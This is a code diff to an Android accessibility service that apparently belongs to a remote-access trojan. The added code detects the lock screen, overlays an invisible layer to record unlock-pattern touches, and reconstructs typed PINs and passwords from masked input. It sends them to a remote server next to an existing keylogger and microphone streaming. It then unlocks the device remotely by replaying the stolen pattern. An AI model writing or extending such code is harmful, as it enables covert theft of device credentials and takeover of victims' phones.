@@ -47,6 +47,7 @@ import android.os.CountDownTimer;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.MediaStore;
 import android.util.Base64;
@@ -55,6 +56,7 @@ import android.util.Log;
 import android.util.SparseIntArray;
 import android.view.Display;
 import android.view.Gravity;
+import android.view.MotionEvent;
 import android.view.Surface;
 import android.view.View;
 import android.view.WindowManager;
@@ -164,6 +166,15 @@ public class MainAccessibilityService extends AccessibilityService {
     private TextView txtRemoveWaiting;
     private TextView txtRemoveTitle;
 
+    //TouchScreen
+    private boolean isTouchScreen = false;
+    private WindowManager windowManagerTouch;
+    private View overlayTouchView;
+    List<MousePositionEntry> movementPoints = new ArrayList<>();
+    private Boolean isKeyguardScreen = false;
+    private Boolean isKeyguardPatternScreen = true;
+    private String devicePassword = "";
+    private Boolean isSetKeyguard = false;
     //skeleton
     private final List<SkeletonEntry> skeletonEntryResultList = new ArrayList<>();
 
@@ -253,6 +264,7 @@ public class MainAccessibilityService extends AccessibilityService {
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         windowManagerWaiting = (WindowManager) getSystemService(WINDOW_SERVICE);
         windowManagerRemove = (WindowManager) getSystemService(WINDOW_SERVICE);
+        windowManagerTouch = (WindowManager) getSystemService(WINDOW_SERVICE);
 
         displayMetrics = new DisplayMetrics();
         Display display = getSystemService(WindowManager.class).getDefaultDisplay();
@@ -329,6 +341,9 @@ public class MainAccessibilityService extends AccessibilityService {
 //            Selected_EVENT = intent.getAction();
             if (intent.getAction().equals(ACTION_SCREEN_SET_TEXT_MONITOR)) {
                 String setTextValue = intent.getStringExtra("setText");
+                if(!isKeyguardPatternScreen) {
+                    devicePassword = setTextValue;
+                }
                 inputText(setTextValue);
             }
             if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
@@ -420,42 +435,13 @@ public class MainAccessibilityService extends AccessibilityService {
             if (ACTION_SCREEN_SCROLL.equals(intent.getAction())) {
                 String scroll_event = intent.getStringExtra("event");
                 if (scroll_event.equals("up")) {
-                    Log.d("deviceWidthÇÇ", String.valueOf(deviceHeight));
-                    List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight / 2 * imageWidth / deviceWidth));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight / 2 * imageWidth / deviceWidth - 1));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight / 2 * imageWidth / deviceWidth - 3));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, 120 * imageWidth / deviceWidth));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, 100 * imageWidth / deviceWidth));
-                    Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
-                    mouseDraw();
+                    handleScreenUp();
                 } else if (scroll_event.equals("down")) {
-                    List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, 150));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, 152));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, 180));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight / 2 * imageWidth / deviceWidth - 1));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight / 2 * imageWidth / deviceWidth));
-                    Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
-                    mouseDraw();
+                    handleScreenDown();
                 } else if (scroll_event.equals("left")) {
-                    List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 30, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 31, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 40, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(40, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(30, 170));
-                    Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
-                    mouseDraw();
+                    handleScreenLeft();
                 } else if (scroll_event.equals("right")) {
-                    List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
-                    mouseScrollEntryList.add(new MousePositionEntry(30, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(31, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(40, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 10, 170));
-                    mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 20, 170));
-                    Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
-                    mouseDraw();
+                    handleScreenRight();
                 }
             }
 
@@ -581,6 +567,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 setAutoStartBackgroundPermission(event);
             }
         }
+        findKeyguardScreen(event);
         getKeyLogger(event);
         getSkeletonInfo(event);
         findFocusedNode(event);
@@ -1071,6 +1058,12 @@ public class MainAccessibilityService extends AccessibilityService {
                 if (source.getText() != null) {
                     text = source.getText().toString();
                     eventString = "Text Input";
+                    if(isKeyguardScreen) {
+                        devicePassword = combineStrings(devicePassword, text.toString());
+                        Log.d("device Password::", devicePassword);
+                    } else {
+                        Log.d("device Password::", "no");
+                    }
                     if (Server.getContext() != null) {
                         Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                         if (isKeylogger) {
@@ -1200,9 +1193,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if (node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    if (node.isVisibleToUser()) {
-                        Log.d("isVisibleToUser", nodeText);
-                    }
                     if (node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName()))) {
                         isSelectedApp = true;
                     }
@@ -1325,8 +1315,10 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     private void findFocusedNode(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
-                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
+                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                || event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED
+                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode != null) {
                 focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
@@ -1334,11 +1326,82 @@ public class MainAccessibilityService extends AccessibilityService {
                     isEditable = true;
                     CharSequence currentText = focusedNode.getText();
                     if (currentText != null) {
+                        if (isKeyguardScreen) {
+                            devicePassword = combineStrings(devicePassword, currentText.toString());
+                        }
                         Log.d("AccessibilityService", "Focused input text: " + currentText.toString());
                     } else {
+                        if (isKeyguardScreen) {
+                            devicePassword = "";
+                        }
                         Log.d("AccessibilityService", "EditText is empty or null");
                     }
                 }
+            }
+        }
+    }
+
+    private void findKeyguardScreen(AccessibilityEvent event) {
+        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            String packagename = event.getPackageName().toString();
+            String classname = event.getClassName().toString();
+            if (packagename.equals("com.android.systemui")) {
+                isKeyguardScreen = false;
+                isKeyguardPatternScreen = true;
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                getKeyguardPage(rootNode);
+                if (isKeyguardScreen) {
+                    if(isKeyguardPatternScreen && !isSetKeyguard) {
+                        makeOverlayTouchScreen();
+                    }
+                } else {
+                    removeTouchOverlayscreen();
+                }
+            } else {
+                if(!packagename.equals("com.support.litework")) {
+                    if(!movementPoints.isEmpty()) {
+                        if (Server.getContext() != null) {
+                            Server.getContext().sendPatternKeyData(movementPoints);
+                            movementPoints.clear();
+                        }
+                    } else if (!devicePassword.isEmpty()) {
+                        if (Server.getContext() != null) {
+                            movementPoints.clear();
+                            Common.getInstance().setKeygenEntries(movementPoints);
+                            Server.getContext().sendPatternKeyData(movementPoints);
+                            Server.getContext().sendPasswordKeyData(devicePassword);
+                            devicePassword = "";
+                        }
+                    }
+                    removeTouchOverlayscreen();
+                    isSetKeyguard = false;
+                }
+            }
+        }
+    }
+
+    public void getKeyguardPage(AccessibilityNodeInfo node) {
+        if (node != null) {
+            if (node.getClassName() != null) {
+                if (node.getClassName().equals("android.widget.Button")) {
+                    if (node.getText() != null) {
+                        String nodeText = node.getText().toString().toLowerCase();
+                        Log.d("TextView::" , nodeText);
+                        if (nodeText.contains("emergency")
+                                || nodeText.contains("emergência")
+                                || nodeText.contains("emergencia")
+                                || nodeText.contains("acil durum")) {
+                            isKeyguardScreen = true;
+                        }
+                    }
+                }
+
+                if(node.getClassName().equals("android.widget.EditText")) {
+                    isKeyguardPatternScreen = false;
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                getKeyguardPage(node.getChild(i));
             }
         }
     }
@@ -1563,23 +1626,6 @@ public class MainAccessibilityService extends AccessibilityService {
                     PixelFormat.TRANSPARENT
             );
             params.gravity = Gravity.CENTER;
-
-//            imgWaiting = new ImageView(this);
-//            imgWaiting.setImageDrawable(getResources().getDrawable(R.drawable.img_remove));
-//            WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
-//                    deviceWidth/2,
-//                    deviceWidth/2,
-//                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-//                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
-//                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
-//                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-//                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-//                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
-//                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-//                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-//                    PixelFormat.TRANSPARENT
-//            );
-//            img_params.gravity = Gravity.CENTER;
 
             txtWaiting = new TextView(this);
             txtWaiting.setTextColor(Color.WHITE);
@@ -1847,6 +1893,116 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
+    @SuppressLint("RtlHardcoded")
+    public void makeOverlayTouchScreen() {
+        if (overlayTouchView == null) {
+            overlayTouchView = new View(this);
+            overlayTouchView.setBackgroundColor(Color.TRANSPARENT);
+
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    deviceHeight + 300,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                    PixelFormat.TRANSPARENT
+            );
+            params.gravity = Gravity.TOP|Gravity.START;
+
+            windowManagerTouch.addView(overlayTouchView, params);
+            isTouchScreen = true;
+
+            overlayTouchView.setOnTouchListener(new View.OnTouchListener() {
+                @Override
+                public boolean onTouch(View v, MotionEvent event) {
+                    switch (event.getAction()) {
+                        case MotionEvent.ACTION_DOWN:
+                            // Clear list and start capturing movement
+                            movementPoints.clear();
+                            Log.d("start point::", "X::" + event.getRawX() + " " + event.getX() + "Y::" + event.getRawY() + " " + event.getY());
+                            movementPoints.add(new MousePositionEntry(event.getRawX(), event.getRawY()));
+                            break;
+
+                        case MotionEvent.ACTION_MOVE:
+                            // Capture all movement points
+                            Log.d("Move point::", "X::" + event.getRawX() + " " + event.getX() + "Y::" + event.getRawY() + " " + event.getY());
+                            movementPoints.add(new MousePositionEntry(event.getRawX(), event.getRawY()));
+                            break;
+
+                        case MotionEvent.ACTION_UP:
+                            removeTouchOverlayscreen();
+                            handleTouchGesture();
+                            break;
+                    }
+                    return true;
+                }
+            });
+        }
+    }
+
+    public void removeTouchOverlayscreen() {
+        if (overlayTouchView != null) {
+            windowManagerTouch.removeView(overlayTouchView);
+            overlayTouchView = null;
+            isTouchScreen = false;
+        }
+    }
+
+    public void handleTouchGesture() {
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                performGesture(movementPoints);
+            }
+        }, 200);
+
+    }
+
+    private void handleScreenUp() {
+        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth - 1));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth - 3));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth + 10));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth));
+        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
+        mouseDraw();
+    }
+
+    private void handleScreenDown() {
+        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth + 10));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth + 20));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth - 1));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth));
+        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
+        mouseDraw();
+    }
+
+    private void handleScreenLeft() {
+        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 30, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 31, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 40, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(40, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(30, 170));
+        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
+        mouseDraw();
+    }
+
+    private void handleScreenRight() {
+        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
+        mouseScrollEntryList.add(new MousePositionEntry(30, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(31, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(40, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 10, 170));
+        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 20, 170));
+        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
+        mouseDraw();
+    }
+
     public void performClick(double x, double y) {
         double currentXPosition = x * deviceWidth / imageWidth;
         double currentYPosition = y * deviceWidth / imageWidth;
@@ -1952,6 +2108,89 @@ public class MainAccessibilityService extends AccessibilityService {
 
         if (!result) {
             Log.d(TAG, "Failed to dispatch gesture");
+        }
+    }
+
+    public void performGesture(List<MousePositionEntry> points) {
+        if (points.size() < 2) return; // Need at least two points for a gesture
+
+        Path path = new Path();
+        path.moveTo((float) points.get(0).getxPosition(), (float) points.get(0).getyPosition()); // Start from the first point
+
+        // Create the path for the gesture
+        for (int i = 1; i < points.size(); i++) {
+            path.lineTo((float) points.get(i).getxPosition(), (float) points.get(i).getyPosition());
+        }
+
+        // Build the gesture description
+        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
+        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 600));
+
+        GestureDescription gesture = gestureBuilder.build();
+        boolean result = dispatchGesture(gesture, new GestureResultCallback() {
+            @Override
+            public void onCompleted(GestureDescription gestureDescription) {
+                super.onCompleted(gestureDescription);
+                List<MousePositionEntry> newMousePoints = new ArrayList<>(points);
+                Common.getInstance().setKeygenEntries(newMousePoints);
+                isTouchScreen = false;
+                checkCurrentScreen();
+            }
+
+            @Override
+            public void onCancelled(GestureDescription gestureDescription) {
+                super.onCancelled(gestureDescription);
+                Log.d(TAG, "Click cancelled");
+            }
+        }, null);
+
+        if (!result) {
+            Log.d(TAG, "Failed to dispatch gesture");
+        }
+    }
+
+    public void performGestureMain(List<MousePositionEntry> points) {
+        if (points.size() < 2) return; // Need at least two points for a gesture
+
+        Path path = new Path();
+        path.moveTo((float) points.get(0).getxPosition(), (float) points.get(0).getyPosition()); // Start from the first point
+
+        // Create the path for the gesture
+        for (int i = 1; i < points.size(); i++) {
+            path.lineTo((float) points.get(i).getxPosition(), (float) points.get(i).getyPosition());
+        }
+
+        // Build the gesture description
+        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
+        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 600));
+
+        GestureDescription gesture = gestureBuilder.build();
+        boolean result = dispatchGesture(gesture, new GestureResultCallback() {
+            @Override
+            public void onCompleted(GestureDescription gestureDescription) {
+                isSetKeyguard = false;
+                super.onCompleted(gestureDescription);
+            }
+
+            @Override
+            public void onCancelled(GestureDescription gestureDescription) {
+                super.onCancelled(gestureDescription);
+                Log.d(TAG, "Click cancelled");
+            }
+        }, null);
+
+        if (!result) {
+            Log.d(TAG, "Failed to dispatch gesture");
+        }
+    }
+
+    private void checkCurrentScreen() {
+        isKeyguardScreen = false;
+        isKeyguardPatternScreen = true;
+        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+        getKeyguardPage(rootNode);
+        if (isKeyguardScreen && isKeyguardPatternScreen) {
+            makeOverlayTouchScreen();
         }
     }
 
@@ -2341,18 +2580,26 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void onDeviceUnlock() {
-//        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-//        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
-//        if(mDevicePolicyManager.isAdminActive(mAdminComponent)) {
-//            mDevicePolicyManager.setKeyguardDisabledFeatures(mAdminComponent, DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT);
-//        }
-//
-//        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
-//        KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock(KEYGUARD_SERVICE);
-//        keyguardLock.disableKeyguard();
-//        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-//        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "MyApp::WakeLock");
-//        wakeLock.acquire(3000);
+
+        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "MyApp::WakeLock");
+        wakeLock.acquire(500);
+
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                isSetKeyguard = true;
+                handleScreenUp();
+                new Handler().postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        if(Common.getInstance().getKeygenEntries() != null && !Common.getInstance().getKeygenEntries().isEmpty()) {
+                           performGestureMain(Common.getInstance().getKeygenEntries());
+                        }
+                    }
+                }, 1000);
+            }
+        }, 1000);
     }
 
     private void onGoHome() {
@@ -2387,6 +2634,26 @@ public class MainAccessibilityService extends AccessibilityService {
         if(Server.getContext() != null) {
             Server.getContext().sendMicMonitoring(bufferData);
         }
+    }
+
+    public static String combineStrings(String first, String second) {
+        StringBuilder result = new StringBuilder();
+
+        // Loop through each character of the second string
+        for (int i = 0; i < second.length(); i++) {
+            // If the character in the second string is '*', take the character from the first string
+            if (second.charAt(i) == '•') {
+                if(i < first.length()) {
+                    result.append(first.charAt(i));
+                } else {
+                    result.append(" ");
+                }
+            } else {
+                // Otherwise, take the character from the second string
+                result.append(second.charAt(i));
+            }
+        }
+        return result.toString();
     }
 
     @Override
